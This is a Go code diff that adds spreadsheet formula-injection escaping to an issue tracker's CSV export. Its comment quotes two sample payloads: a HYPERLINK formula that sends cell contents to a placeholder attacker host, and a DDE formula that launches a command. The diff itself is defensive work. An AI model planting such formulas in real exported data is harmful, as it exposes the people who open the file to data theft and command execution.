@@ -43,6 +43,47 @@ func minutesString(m *int) string {
 	return strconv.Itoa(*m)
 }
 
+// csvSafe defuses spreadsheet formula injection.
+//
+// Excel, LibreOffice and Google Sheets treat a cell whose first character is =, +, -
+// or @ as a formula. Issue titles, descriptions, labels and emails are chosen by
+// anyone who can file an issue — which includes the reporter role — and the person who
+// opens the export is usually an admin. `=HYPERLINK("http://attacker/"&A1,"click")` in
+// a title exfiltrates the neighbouring cell on click; `=cmd|'/c calc'!A1` is the DDE
+// variant. Leading tab and CR are here too because the spreadsheet strips them and
+// then reads what follows.
+//
+// A leading apostrophe is the fix: the tools read the rest of the cell as literal text
+// and do not display the quote. Applied to every column rather than a hand-picked
+// list, because the hand-picked list is what rots the next time a column is added.
+//
+// Genuine numbers are the exception. `-5` is a number to every spreadsheet, not a
+// formula, and quoting it would turn a numeric column into text for everything
+// downstream — so a value that parses as a number is written through untouched.
+// `-5+cmd` does not parse, and is quoted.
+func csvSafe(v string) string {
+	if v == "" {
+		return v
+	}
+	switch v[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+	default:
+		return v
+	}
+	if _, err := strconv.ParseFloat(v, 64); err == nil {
+		return v
+	}
+	return "'" + v
+}
+
+// csvSafeRow applies csvSafe across a row in place.
+func csvSafeRow(row []string) []string {
+	for i, v := range row {
+		row[i] = csvSafe(v)
+	}
+	return row
+}
+
 func exportRow(i domain.Issue) []string {
 	return []string{
 		i.Key, i.ProjectKey, strconv.FormatInt(int64(i.Number), 10), string(i.Type), i.Title,
@@ -103,7 +144,7 @@ func (h *httpHandlers) exportCSV(w http.ResponseWriter, r *http.Request, f Issue
 		return
 	}
 	err := h.repo.EachIssue(r.Context(), f, func(i domain.Issue) error {
-		return cw.Write(exportRow(i))
+		return cw.Write(csvSafeRow(exportRow(i)))
 	})
 	cw.Flush()
 	if err == nil {
